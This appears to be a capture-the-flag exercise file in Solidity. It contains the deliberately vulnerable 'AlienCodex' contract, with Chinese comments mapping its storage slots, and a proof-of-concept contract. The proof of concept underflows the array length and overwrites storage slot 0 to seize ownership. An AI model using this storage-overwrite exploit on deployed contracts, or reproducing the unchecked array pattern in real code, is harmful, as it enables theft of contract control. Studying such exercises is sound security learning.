@@ -1,0 +1,57 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.5.0;
+
+import "./helpers/Ownable-05.sol";
+
+contract AlienCodex is Ownable {
+    bool public contact;
+    bytes32[] public codex;
+    // slot 0 owner contact
+    // slot 1 codex length
+    // slot keccak256(1) codex[0]
+    // slot keccak256(2) codex[1]
+    // keccak256(1) 到 2**256 - 1 的所有 slot 都可以被 codex 使用
+    // slot 2**256-1 codex[2**256-1-keccak256(1)]
+    // slot 0 codex[2**256-1-keccak256(1) + 1]
+
+    modifier contacted() {
+        assert(contact);
+        _;
+    }
+
+    function make_contact() public {
+        contact = true;
+    }
+
+    function record(bytes32 _content) public contacted {
+        codex.push(_content);
+    }
+
+    function retract() public contacted {
+        codex.length--;
+    }
+
+    function revise(uint i, bytes32 _content) public contacted {
+        codex[i] = _content;
+    }
+}
+
+contract AlienCodexPOC {
+    constructor(address instance) public {
+        AlienCodex alienCodex = AlienCodex(instance);
+        alienCodex.make_contact();
+        // alienCodex.revise(
+        //     100,
+        //     0x000000000000000000000000Dadada681e6270E1D0181442220A2e5608B11d21
+        // );
+        alienCodex.retract(); // 将数组扩容到最大
+        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
+        alienCodex.revise(
+            index,
+            0x000000000000000000000000Dadada681e6270E1D0181442220A2e5608B11d21
+        );
+        assert(
+            alienCodex.owner() == 0xDadada681e6270E1D0181442220A2e5608B11d21
+        );
+    }
+}
